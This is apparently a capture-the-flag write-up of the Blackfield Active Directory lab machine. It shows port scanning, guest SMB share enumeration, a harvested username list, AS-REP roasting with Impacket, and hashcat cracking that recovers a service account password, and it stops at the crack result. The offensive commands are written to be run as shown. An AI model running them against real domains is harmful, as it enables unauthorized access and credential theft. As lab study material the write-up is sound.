Target : 10.129.229.17

Date : 11/06/2026

```bash
>  echo "10.129.229.17 blackfield.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.229.17  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 21:11 +0200  
Nmap scan report for blackfield.htb (10.129.229.17)  
Host is up (0.14s latency).  
Not shown: 65529 filtered tcp ports (no-response)  
PORT     STATE SERVICE    VERSION  
53/tcp   open  tcpwrapped  
88/tcp   open  tcpwrapped  
135/tcp  open  tcpwrapped  
445/tcp  open  tcpwrapped  
593/tcp  open  tcpwrapped  
5985/tcp open  tcpwrapped  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)  
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10  
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1903 - 22H2 (88%)  
No exact OS matches for host (test conditions non-ideal).  
  
Host script results:  
| smb2-time:    
|   date: 2026-06-12T02:12:29  
|_  start_date: N/A  
|_clock-skew: 6h59m59s  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 126.23 seconds
```

The first fullport scan is strange : it tells us it might be an `Active Directory` with ports `Kerberos 88/tcp` `msrpc 135/tcp` and `rpc over http 593/tcp` as well as `smb 445/tcp` everything is `tcpwrapped` and no `389/tcp` LDAP, with also port `DNS 53/tcp`.

We'll first try to get into samba using `netexec` and `guest` :

```bash
>  nxc smb 10.129.229.17 -u guest -p ''  
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\guest:    
>  nxc smb 10.129.229.17 -u guest -p '' --shares  
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\guest:    
SMB         10.129.229.17   445    DC01             [*] Enumerated shares  
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark  
SMB         10.129.229.17   445    DC01             -----           -----------     ------  
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.229.17   445    DC01             C$                              Default share  
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.  
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share    
SMB         10.129.229.17   445    DC01             profiles$       READ               
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share
```

We can get in, with a `READ` write on `profile$` and a `forensic` share that looks interesting.
This is indeed a `DC`.

We'll explore the `profile$`.

```bash
smb: \> ls  
 .                                   D        0  Wed Jun  3 18:47:12 2020  
 ..                                  D        0  Wed Jun  3 18:47:12 2020  
 AAlleni                             D        0  Wed Jun  3 18:47:11 2020  
 ABarteski                           D        0  Wed Jun  3 18:47:11 2020  
 ABekesz                             D        0  Wed Jun  3 18:47:11 2020  
 ABenzies                            D        0  Wed Jun  3 18:47:11 2020  
 ABiemiller                          D        0  Wed Jun  3 18:47:11 2020  
 AChampken                           D        0  Wed Jun  3 18:47:11 2020  
 ACheretei                           D        0  Wed Jun  3 18:47:11 2020  
 ACsonaki                            D        0  Wed Jun  3 18:47:11 2020  
 AHigchens                           D        0  Wed Jun  3 18:47:11 2020  
 AJaquemai                           D        0  Wed Jun  3 18:47:11 2020  
 AKlado                              D        0  Wed Jun  3 18:47:11 2020  
 AKoffenburger                       D        0  Wed Jun  3 18:47:11 2020  
 AKollolli                           D        0  Wed Jun  3 18:47:11 2020  
 AKruppe                             D        0  Wed Jun  3 18:47:11 2020  
 AKubale                             D        0  Wed Jun  3 18:47:11 2020  
 ALamerz                             D        0  Wed Jun  3 18:47:11 2020  
 AMaceldon                           D        0  Wed Jun  3 18:47:11 2020  
 AMasalunga                          D        0  Wed Jun  3 18:47:11 2020  
 ANavay                              D        0  Wed Jun  3 18:47:11 2020  
 ANesterova                          D        0  Wed Jun  3 18:47:11 2020  
 ANeusse                             D        0  Wed Jun  3 18:47:11 2020  
 AOkleshen                           D        0  Wed Jun  3 18:47:11 2020  
 APustulka                           D        0  Wed Jun  3 18:47:11 2020  
 ARotella                            D        0  Wed Jun  3 18:47:11 2020  
 ASanwardeker                        D        0  Wed Jun  3 18:47:11 2020  
 AShadaia                            D        0  Wed Jun  3 18:47:11 2020  
 ASischo                             D        0  Wed Jun  3 18:47:11 2020  
 ASpruce                             D        0  Wed Jun  3 18:47:11 2020  
 ATakach                             D        0  Wed Jun  3 18:47:11 2020  
 ATaueg                              D        0  Wed Jun  3 18:47:11 2020  
 ATwardowski                         D        0  Wed Jun  3 18:47:11 2020  
 audit2020                           D        0  Wed Jun  3 18:47:11 2020  
 AWangenheim                         D        0  Wed Jun  3 18:47:11 2020  
 AWorsey                             D        0  Wed Jun  3 18:47:11 2020  
 AZigmunt                            D        0  Wed Jun  3 18:47:11 2020  
 BBakajza                            D        0  Wed Jun  3 18:47:11 2020  
 BBeloucif                           D        0  Wed Jun  3 18:47:11 2020  
 BCarmitcheal                        D        0  Wed Jun  3 18:47:11 2020  
 BConsultant                         D        0  Wed Jun  3 18:47:11 2020  
 BErdossy                            D        0  Wed Jun  3 18:47:11 2020  
 BGeminski                           D        0  Wed Jun  3 18:47:11 2020  
 BLostal                             D        0  Wed Jun  3 18:47:11 2020  
 BMannise                            D        0  Wed Jun  3 18:47:11 2020  
 BNovrotsky                          D        0  Wed Jun  3 18:47:11 2020  
 BRigiero                            D        0  Wed Jun  3 18:47:11 2020  
 BSamkoses                           D        0  Wed Jun  3 18:47:11 2020  
 BZandonella                         D        0  Wed Jun  3 18:47:11 2020  
 CAcherman                           D        0  Wed Jun  3 18:47:12 2020  
 CAkbari                             D        0  Wed Jun  3 18:47:12 2020  
 CAldhowaihi                         D        0  Wed Jun  3 18:47:12 2020  
 CArgyropolous                       D        0  Wed Jun  3 18:47:12 2020  
 CDufrasne                           D        0  Wed Jun  3 18:47:12 2020  
 CGronk                              D        0  Wed Jun  3 18:47:11 2020  
 Chiucarello                         D        0  Wed Jun  3 18:47:11 2020  
 Chiuccariello                       D        0  Wed Jun  3 18:47:12 2020  
 CHoytal                             D        0  Wed Jun  3 18:47:12 2020  
 CKijauskas                          D        0  Wed Jun  3 18:47:12 2020  
 CKolbo                              D        0  Wed Jun  3 18:47:12 2020  
 CMakutenas                          D        0  Wed Jun  3 18:47:12 2020  
 CMorcillo                           D        0  Wed Jun  3 18:47:11 2020  
 CSchandall                          D        0  Wed Jun  3 18:47:12 2020  
 CSelters                            D        0  Wed Jun  3 18:47:12 2020  
 CTolmie                             D        0  Wed Jun  3 18:47:12 2020  
 DCecere                             D        0  Wed Jun  3 18:47:12 2020  
 DChintalapalli                      D        0  Wed Jun  3 18:47:12 2020  
 DCwilich                            D        0  Wed Jun  3 18:47:12 2020  
 DGarbatiuc                          D        0  Wed Jun  3 18:47:12 2020  
 DKemesies                           D        0  Wed Jun  3 18:47:12 2020  
 DMatuka                             D        0  Wed Jun  3 18:47:12 2020  
 DMedeme                             D        0  Wed Jun  3 18:47:12 2020  
 DMeherek                            D        0  Wed Jun  3 18:47:12 2020  
 DMetych                             D        0  Wed Jun  3 18:47:12 2020  
 DPaskalev                           D        0  Wed Jun  3 18:47:12 2020  
 DPriporov                           D        0  Wed Jun  3 18:47:12 2020  
 DRusanovskaya                       D        0  Wed Jun  3 18:47:12 2020  
 DVellela                            D        0  Wed Jun  3 18:47:12 2020  
 DVogleson                           D        0  Wed Jun  3 18:47:12 2020  
 DZwinak                             D        0  Wed Jun  3 18:47:12 2020  
 EBoley                              D        0  Wed Jun  3 18:47:12 2020  
 EEulau                              D        0  Wed Jun  3 18:47:12 2020  
 EFeatherling                        D        0  Wed Jun  3 18:47:12 2020  
 EFrixione                           D        0  Wed Jun  3 18:47:12 2020  
 EJenorik                            D        0  Wed Jun  3 18:47:12 2020  
 EKmilanovic                         D        0  Wed Jun  3 18:47:12 2020  
 ElKatkowsky                         D        0  Wed Jun  3 18:47:12 2020  
 EmaCaratenuto                       D        0  Wed Jun  3 18:47:12 2020  
 EPalislamovic                       D        0  Wed Jun  3 18:47:12 2020  
 EPryar                              D        0  Wed Jun  3 18:47:12 2020  
 ESachhitello                        D        0  Wed Jun  3 18:47:12 2020  
 ESariotti                           D        0  Wed Jun  3 18:47:12 2020  
 ETurgano                            D        0  Wed Jun  3 18:47:12 2020  
 EWojtila                            D        0  Wed Jun  3 18:47:12 2020  
 FAlirezai                           D        0  Wed Jun  3 18:47:12 2020  
 FBaldwind                           D        0  Wed Jun  3 18:47:12 2020  
 FBroj                               D        0  Wed Jun  3 18:47:12 2020  
 FDeblaquire                         D        0  Wed Jun  3 18:47:12 2020  
 FDegeorgio                          D        0  Wed Jun  3 18:47:12 2020  
 FianLaginja                         D        0  Wed Jun  3 18:47:12 2020  
 FLasokowski                         D        0  Wed Jun  3 18:47:12 2020  
 FPflum                              D        0  Wed Jun  3 18:47:12 2020  
 FReffey                             D        0  Wed Jun  3 18:47:12 2020  
 GaBelithe                           D        0  Wed Jun  3 18:47:12 2020  
 Gareld                              D        0  Wed Jun  3 18:47:12 2020  
 GBatowski                           D        0  Wed Jun  3 18:47:12 2020  
 GForshalger                         D        0  Wed Jun  3 18:47:12 2020  
 GGomane                             D        0  Wed Jun  3 18:47:12 2020  
 GHisek                              D        0  Wed Jun  3 18:47:12 2020  
 GMaroufkhani                        D        0  Wed Jun  3 18:47:12 2020  
 GMerewether                         D        0  Wed Jun  3 18:47:12 2020  
 GQuinniey                           D        0  Wed Jun  3 18:47:12 2020  
 GRoswurm                            D        0  Wed Jun  3 18:47:12 2020  
 GWiegard                            D        0  Wed Jun  3 18:47:12 2020  
 HBlaziewske                         D        0  Wed Jun  3 18:47:12 2020  
 HColantino                          D        0  Wed Jun  3 18:47:12 2020  
 HConforto                           D        0  Wed Jun  3 18:47:12 2020  
 HCunnally                           D        0  Wed Jun  3 18:47:12 2020  
 HGougen                             D        0  Wed Jun  3 18:47:12 2020  
 HKostova                            D        0  Wed Jun  3 18:47:12 2020  
 IChristijr                          D        0  Wed Jun  3 18:47:12 2020  
 IKoledo                             D        0  Wed Jun  3 18:47:12 2020  
 IKotecky                            D        0  Wed Jun  3 18:47:12 2020  
 ISantosi                            D        0  Wed Jun  3 18:47:12 2020  
 JAngvall                            D        0  Wed Jun  3 18:47:12 2020  
 JBehmoiras                          D        0  Wed Jun  3 18:47:12 2020  
 JDanten                             D        0  Wed Jun  3 18:47:12 2020  
 JDjouka                             D        0  Wed Jun  3 18:47:12 2020  
 JKondziola                          D        0  Wed Jun  3 18:47:12 2020  
 JLeytushsenior                      D        0  Wed Jun  3 18:47:12 2020  
 JLuthner                            D        0  Wed Jun  3 18:47:12 2020  
 JMoorehendrickson                   D        0  Wed Jun  3 18:47:12 2020  
 JPistachio                          D        0  Wed Jun  3 18:47:12 2020  
 JScima                              D        0  Wed Jun  3 18:47:12 2020  
 JSebaali                            D        0  Wed Jun  3 18:47:12 2020  
 JShoenherr                          D        0  Wed Jun  3 18:47:12 2020  
 JShuselvt                           D        0  Wed Jun  3 18:47:12 2020  
 KAmavisca                           D        0  Wed Jun  3 18:47:12 2020  
 KAtolikian                          D        0  Wed Jun  3 18:47:12 2020  
 KBrokinn                            D        0  Wed Jun  3 18:47:12 2020  
 KCockeril                           D        0  Wed Jun  3 18:47:12 2020  
 KColtart                            D        0  Wed Jun  3 18:47:12 2020  
 KCyster                             D        0  Wed Jun  3 18:47:12 2020  
 KDorney                             D        0  Wed Jun  3 18:47:12 2020  
 KKoesno                             D        0  Wed Jun  3 18:47:12 2020  
 KLangfur                            D        0  Wed Jun  3 18:47:12 2020  
 KMahalik                            D        0  Wed Jun  3 18:47:12 2020  
 KMasloch                            D        0  Wed Jun  3 18:47:12 2020  
 KMibach                             D        0  Wed Jun  3 18:47:12 2020  
 KParvankova                         D        0  Wed Jun  3 18:47:12 2020  
 KPregnolato                         D        0  Wed Jun  3 18:47:12 2020  
 KRasmor                             D        0  Wed Jun  3 18:47:12 2020  
 KShievitz                           D        0  Wed Jun  3 18:47:12 2020  
 KSojdelius                          D        0  Wed Jun  3 18:47:12 2020  
 KTambourgi                          D        0  Wed Jun  3 18:47:12 2020  
 KVlahopoulos                        D        0  Wed Jun  3 18:47:12 2020  
 KZyballa                            D        0  Wed Jun  3 18:47:12 2020  
 LBajewsky                           D        0  Wed Jun  3 18:47:12 2020  
 LBaligand                           D        0  Wed Jun  3 18:47:12 2020  
 LBarhamand                          D        0  Wed Jun  3 18:47:12 2020  
 LBirer                              D        0  Wed Jun  3 18:47:12 2020  
 LBobelis                            D        0  Wed Jun  3 18:47:12 2020  
 LChippel                            D        0  Wed Jun  3 18:47:12 2020  
 LChoffin                            D        0  Wed Jun  3 18:47:12 2020  
 LCominelli                          D        0  Wed Jun  3 18:47:12 2020  
 LDruge                              D        0  Wed Jun  3 18:47:12 2020  
 LEzepek                             D        0  Wed Jun  3 18:47:12 2020  
 LHyungkim                           D        0  Wed Jun  3 18:47:12 2020  
 LKarabag                            D        0  Wed Jun  3 18:47:12 2020  
 LKirousis                           D        0  Wed Jun  3 18:47:12 2020  
 LKnade                              D        0  Wed Jun  3 18:47:12 2020  
 LKrioua                             D        0  Wed Jun  3 18:47:12 2020  
 LLefebvre                           D        0  Wed Jun  3 18:47:12 2020  
 LLoeradeavilez                      D        0  Wed Jun  3 18:47:12 2020  
 LMichoud                            D        0  Wed Jun  3 18:47:12 2020  
 LTindall                            D        0  Wed Jun  3 18:47:12 2020  
 LYturbe                             D        0  Wed Jun  3 18:47:12 2020  
 MArcynski                           D        0  Wed Jun  3 18:47:12 2020  
 MAthilakshmi                        D        0  Wed Jun  3 18:47:12 2020  
 MAttravanam                         D        0  Wed Jun  3 18:47:12 2020  
 MBrambini                           D        0  Wed Jun  3 18:47:12 2020  
 MHatziantoniou                      D        0  Wed Jun  3 18:47:12 2020  
 MHoerauf                            D        0  Wed Jun  3 18:47:12 2020  
 MKermarrec                          D        0  Wed Jun  3 18:47:12 2020  
 MKillberg                           D        0  Wed Jun  3 18:47:12 2020  
 MLapesh                             D        0  Wed Jun  3 18:47:12 2020  
 MMakhsous                           D        0  Wed Jun  3 18:47:12 2020  
 MMerezio                            D        0  Wed Jun  3 18:47:12 2020  
 MNaciri                             D        0  Wed Jun  3 18:47:12 2020  
 MShanmugarajah                      D        0  Wed Jun  3 18:47:12 2020  
 MSichkar                            D        0  Wed Jun  3 18:47:12 2020  
 MTemko                              D        0  Wed Jun  3 18:47:12 2020  
 MTipirneni                          D        0  Wed Jun  3 18:47:12 2020  
 MTonuri                             D        0  Wed Jun  3 18:47:12 2020  
 MVanarsdel                          D        0  Wed Jun  3 18:47:12 2020  
 NBellibas                           D        0  Wed Jun  3 18:47:12 2020  
 NDikoka                             D        0  Wed Jun  3 18:47:12 2020  
 NGenevro                            D        0  Wed Jun  3 18:47:12 2020  
 NGoddanti                           D        0  Wed Jun  3 18:47:12 2020  
 NMrdirk                             D        0  Wed Jun  3 18:47:12 2020  
 NPulido                             D        0  Wed Jun  3 18:47:12 2020  
 NRonges                             D        0  Wed Jun  3 18:47:12 2020  
 NSchepkie                           D        0  Wed Jun  3 18:47:12 2020  
 NVanpraet                           D        0  Wed Jun  3 18:47:12 2020  
 OBelghazi                           D        0  Wed Jun  3 18:47:12 2020  
 OBushey                             D        0  Wed Jun  3 18:47:12 2020  
 OHardybala                          D        0  Wed Jun  3 18:47:12 2020  
 OLunas                              D        0  Wed Jun  3 18:47:12 2020  
 ORbabka                             D        0  Wed Jun  3 18:47:12 2020  
 PBourrat                            D        0  Wed Jun  3 18:47:12 2020  
 PBozzelle                           D        0  Wed Jun  3 18:47:12 2020  
 PBranti                             D        0  Wed Jun  3 18:47:12 2020  
 PCapperella                         D        0  Wed Jun  3 18:47:12 2020  
 PCurtz                              D        0  Wed Jun  3 18:47:12 2020  
 PDoreste                            D        0  Wed Jun  3 18:47:12 2020  
 PGegnas                             D        0  Wed Jun  3 18:47:12 2020  
 PMasulla                            D        0  Wed Jun  3 18:47:12 2020  
 PMendlinger                         D        0  Wed Jun  3 18:47:12 2020  
 PParakat                            D        0  Wed Jun  3 18:47:12 2020  
 PProvencer                          D        0  Wed Jun  3 18:47:12 2020  
 PTesik                              D        0  Wed Jun  3 18:47:12 2020  
 PVinkovich                          D        0  Wed Jun  3 18:47:12 2020  
 PVirding                            D        0  Wed Jun  3 18:47:12 2020  
 PWeinkaus                           D        0  Wed Jun  3 18:47:12 2020  
 RBaliukonis                         D        0  Wed Jun  3 18:47:12 2020  
 RBochare                            D        0  Wed Jun  3 18:47:12 2020  
 RKrnjaic                            D        0  Wed Jun  3 18:47:12 2020  
 RNemnich                            D        0  Wed Jun  3 18:47:12 2020  
 RPoretsky                           D        0  Wed Jun  3 18:47:12 2020  
 RStuehringer                        D        0  Wed Jun  3 18:47:12 2020  
 RSzewczuga                          D        0  Wed Jun  3 18:47:12 2020  
 RVallandas                          D        0  Wed Jun  3 18:47:12 2020  
 RWeatherl                           D        0  Wed Jun  3 18:47:12 2020  
 RWissor                             D        0  Wed Jun  3 18:47:12 2020  
 SAbdulagatov                        D        0  Wed Jun  3 18:47:12 2020  
 SAjowi                              D        0  Wed Jun  3 18:47:12 2020  
 SAlguwaihes                         D        0  Wed Jun  3 18:47:12 2020  
 SBonaparte                          D        0  Wed Jun  3 18:47:12 2020  
 SBouzane                            D        0  Wed Jun  3 18:47:12 2020  
 SChatin                             D        0  Wed Jun  3 18:47:12 2020  
 SDellabitta                         D        0  Wed Jun  3 18:47:12 2020  
 SDhodapkar                          D        0  Wed Jun  3 18:47:12 2020  
 SEulert                             D        0  Wed Jun  3 18:47:12 2020  
 SFadrigalan                         D        0  Wed Jun  3 18:47:12 2020  
 SGolds                              D        0  Wed Jun  3 18:47:12 2020  
 SGrifasi                            D        0  Wed Jun  3 18:47:12 2020  
 SGtlinas                            D        0  Wed Jun  3 18:47:12 2020  
 SHauht                              D        0  Wed Jun  3 18:47:12 2020  
 SHederian                           D        0  Wed Jun  3 18:47:12 2020  
 SHelregel                           D        0  Wed Jun  3 18:47:12 2020  
 SKrulig                             D        0  Wed Jun  3 18:47:12 2020  
 SLewrie                             D        0  Wed Jun  3 18:47:12 2020  
 SMaskil                             D        0  Wed Jun  3 18:47:12 2020  
 Smocker                             D        0  Wed Jun  3 18:47:12 2020  
 SMoyta                              D        0  Wed Jun  3 18:47:12 2020  
 SRaustiala                          D        0  Wed Jun  3 18:47:12 2020  
 SReppond                            D        0  Wed Jun  3 18:47:12 2020  
 SSicliano                           D        0  Wed Jun  3 18:47:12 2020  
 SSilex                              D        0  Wed Jun  3 18:47:12 2020  
 SSolsbak                            D        0  Wed Jun  3 18:47:12 2020  
 STousignaut                         D        0  Wed Jun  3 18:47:12 2020  
 support                             D        0  Wed Jun  3 18:47:12 2020  
 svc_backup                          D        0  Wed Jun  3 18:47:12 2020  
 SWhyte                              D        0  Wed Jun  3 18:47:12 2020  
 SWynigear                           D        0  Wed Jun  3 18:47:12 2020  
 TAwaysheh                           D        0  Wed Jun  3 18:47:12 2020  
 TBadenbach                          D        0  Wed Jun  3 18:47:12 2020  
 TCaffo                              D        0  Wed Jun  3 18:47:12 2020  
 TCassalom                           D        0  Wed Jun  3 18:47:12 2020  
 TEiselt                             D        0  Wed Jun  3 18:47:12 2020  
 TFerencdo                           D        0  Wed Jun  3 18:47:12 2020  
 TGaleazza                           D        0  Wed Jun  3 18:47:12 2020  
 TKauten                             D        0  Wed Jun  3 18:47:12 2020  
 TKnupke                             D        0  Wed Jun  3 18:47:12 2020  
 TLintlop                            D        0  Wed Jun  3 18:47:12 2020  
 TMusselli                           D        0  Wed Jun  3 18:47:12 2020  
 TOust                               D        0  Wed Jun  3 18:47:12 2020  
 TSlupka                             D        0  Wed Jun  3 18:47:12 2020  
 TStausland                          D        0  Wed Jun  3 18:47:12 2020  
 TZumpella                           D        0  Wed Jun  3 18:47:12 2020  
 UCrofskey                           D        0  Wed Jun  3 18:47:12 2020  
 UMarylebone                         D        0  Wed Jun  3 18:47:12 2020  
 UPyrke                              D        0  Wed Jun  3 18:47:12 2020  
 VBublavy                            D        0  Wed Jun  3 18:47:12 2020  
 VButziger                           D        0  Wed Jun  3 18:47:12 2020  
 VFuscca                             D        0  Wed Jun  3 18:47:12 2020  
 VLitschauer                         D        0  Wed Jun  3 18:47:12 2020  
 VMamchuk                            D        0  Wed Jun  3 18:47:12 2020  
 VMarija                             D        0  Wed Jun  3 18:47:12 2020  
 VOlaosun                            D        0  Wed Jun  3 18:47:12 2020  
 VPapalouca                          D        0  Wed Jun  3 18:47:12 2020  
 WSaldat                             D        0  Wed Jun  3 18:47:12 2020  
 WVerzhbytska                        D        0  Wed Jun  3 18:47:12 2020  
 WZelazny                            D        0  Wed Jun  3 18:47:12 2020  
 XBemelen                            D        0  Wed Jun  3 18:47:12 2020  
 XDadant                             D        0  Wed Jun  3 18:47:12 2020  
 XDebes                              D        0  Wed Jun  3 18:47:12 2020  
 XKonegni                            D        0  Wed Jun  3 18:47:12 2020  
 XRykiel                             D        0  Wed Jun  3 18:47:12 2020  
 YBleasdale                          D        0  Wed Jun  3 18:47:12 2020  
 YHuftalin                           D        0  Wed Jun  3 18:47:12 2020  
 YKivlen                             D        0  Wed Jun  3 18:47:12 2020  
 YKozlicki                           D        0  Wed Jun  3 18:47:12 2020  
 YNyirenda                           D        0  Wed Jun  3 18:47:12 2020  
 YPredestin                          D        0  Wed Jun  3 18:47:12 2020  
 YSeturino                           D        0  Wed Jun  3 18:47:12 2020  
 YSkoropada                          D        0  Wed Jun  3 18:47:12 2020  
 YVonebers                           D        0  Wed Jun  3 18:47:12 2020  
 YZarpentine                         D        0  Wed Jun  3 18:47:12 2020  
 ZAlatti                             D        0  Wed Jun  3 18:47:12 2020  
 ZKrenselewski                       D        0  Wed Jun  3 18:47:12 2020  
 ZMalaab                             D        0  Wed Jun  3 18:47:12 2020  
 ZMiick                              D        0  Wed Jun  3 18:47:12 2020  
 ZScozzari                           D        0  Wed Jun  3 18:47:12 2020  
 ZTimofeeff                          D        0  Wed Jun  3 18:47:12 2020  
 ZWausik                             D        0  Wed Jun  3 18:47:12 2020  
  
               5102079 blocks of size 4096. 1692102 blocks available
```

We got a lot of users, unfortunately only their first initial and their last name, no full name.

We still make a full username list out of it :

```bash
>  smbclient -N //10.129.229.17/profiles\$ -U 'BLACKFIELD\guest%' -c 'ls' 2>/dev/null | awk '$2=="D" && $1!="." && $1!=".." {print $1}' | sort -u > /tmp/blackfield_users.txt && wc -l /tmp/blackfield_users.txt
```

We have some outliars though if we look more closely : `svc_backup ; audit2020`.

Since we got an incomplete fullport nmap, maybe there are some vhosts that might give us the actual DC name and more information.

We try `fuzzing vhosts, subdomains and domains` and `katana headless` but we don't find anything, so we have to find another way in.

We'll `AS-REP roast` the `blackfield_users.txt` userlist with `Impacket`, since we don't have the `DC` name we'll use `BLACKFIELD.local` :

```bash
>  GetNPUsers.py BLACKFIELD.local/ -no-pass -usersfile /tmp/blackfield_users.txt -dc-ip 10.129.229.17 -request 2>&1 | tee /tmp/blackfield_asrep.txt
```

`[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set`

and 
```
$krb5asrep$23$support@BLACKFIELD.LOCAL:3c6339c56d3b666cc10c527e458979e0$3a705053390f0682d31ae496b0f6cdcb0d616b3784b77dc214e1f2f1f84430fea3c037d719df7f1dae1e344f469892c9ef5ac3a26234234f8e29233c88df7c30e55d93b899  
d20e244a68144136326a98887cbc74fb2e4d7d9779699dbe71bdeb1768d12347f2212e46b803a48c29b74b8ad9f3a0fc8def0734c99ae9b018a4c73deb82f500e8e4efa637f238aaffeed37ed24e8e8c16123fb4fb14686f2ea56a8707a5eec7f3a873abd94ca5c3cb  
b2ecd6297976ead597fae225113806ce0b1cbee5b34c14c95abb3517d7d42b0fe67fa88df76630292b17ee3e88a6509cf85751755ea7837b118e31491cb54758667f61803272
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set`
```

So we got a `Kerberos AS-REP` hash.

```bash
>  printf '$krb5asrep$23$support@BLACKFIELD.LOCAL:3c6339c56d3b666cc10c527e458979e0$3a705053390f0682d31ae496b0f6cdcb0d616b3784b77dc214e1f2f1f84430fea3c037d719df7f1dae1e344f469892c9ef5ac3a26234234f8e29233c88df7c3  
0e55d93b899d20e244a68144136326a98887cbc74fb2e4d7d9779699dbe71bdeb1768d12347f2212e46b803a48c29b74b8ad9f3a0fc8def0734c99ae9b018a4c73deb82f500e8e4efa637f238aaffeed37ed24e8e8c16123fb4fb14686f2ea56a8707a5eec7f3a873a  
bd94ca5c3cbb2ecd6297976ead597fae225113806ce0b1cbee5b34c14c95abb3517d7d42b0fe67fa88df76630292b17ee3e88a6509cf85751755ea7837b118e31491cb54758667f61803272' > black.hash  
>  cat black.hash  
$krb5asrep$23$support@BLACKFIELD.LOCAL:3c6339c56d3b666cc10c527e458979e0$3a705053390f0682d31ae496b0f6cdcb0d616b3784b77dc214e1f2f1f84430fea3c037d719df7f1dae1e344f469892c9ef5ac3a26234234f8e29233c88df7c30e55d93b899  
d20e244a68144136326a98887cbc74fb2e4d7d9779699dbe71bdeb1768d12347f2212e46b803a48c29b74b8ad9f3a0fc8def0734c99ae9b018a4c73deb82f500e8e4efa637f238aaffeed37ed24e8e8c16123fb4fb14686f2ea56a8707a5eec7f3a873abd94ca5c3cb  
b2ecd6297976ead597fae225113806ce0b1cbee5b34c14c95abb3517d7d42b0fe67fa88df76630292b17ee3e88a6509cf85751755ea7837b118e31491cb54758667f61803272%
```

Since it's a `kerberos AS-REP` for `support` (``$krb5asrep$23$username@...`) we'll use `hashcat -m 18200`.

```bash
>  hashcat -m 18200 black.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (10854 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
Cracking performance lower than expected?                    
  
* Append -O to the commandline.  
 This lowers the maximum supported password/salt length (usually down to 32).  
  
* Append -w 3 to the commandline.  
 This can cause your screen to lag.  
  
* Append -S to the commandline.  
 This has a drastic speed impact but can be better for specific attacks.  
 Typical scenarios are a small wordlist but a large ruleset.  
  
* Update your backend API runtime / driver the right way:  
 https://hashcat.net/faq/wrongdriver  
  
* Create more work items to make use of your parallelization power:  
 https://hashcat.net/faq/morework  
  
$krb5asrep$23$support@BLACKFIELD.LOCAL:3c6339c56d3b666cc10c527e458979e0$3a705053390f0682d31ae496b0f6cdcb0d616b3784b77dc214e1f2f1f84430fea3c037d719df7f1dae1e344f469892c9ef5ac3a26234234f8e29233c88df7c30e55d93b899  
d20e244a68144136326a98887cbc74fb2e4d7d9779699dbe71bdeb1768d12347f2212e46b803a48c29b74b8ad9f3a0fc8def0734c99ae9b018a4c73deb82f500e8e4efa637f238aaffeed37ed24e8e8c16123fb4fb14686f2ea56a8707a5eec7f3a873abd94ca5c3cb  
b2ecd6297976ead597fae225113806ce0b1cbee5b34c14c95abb3517d7d42b0fe67fa88df76630292b17ee3e88a6509cf85751755ea7837b118e31491cb54758667f61803272:#00^BlackKnight  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)  
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:3c6339c56d3b...803272  
Time.Started.....: Thu Jun 11 22:00:47 2026 (10 secs)  
Time.Estimated...: Thu Jun 11 22:00:57 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1358.9 kH/s (4.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 14336000/14344384 (99.94%)  
Rejected.........: 0/14336000 (0.00%)  
Restore.Point....: 14327808/14344384 (99.88%)  
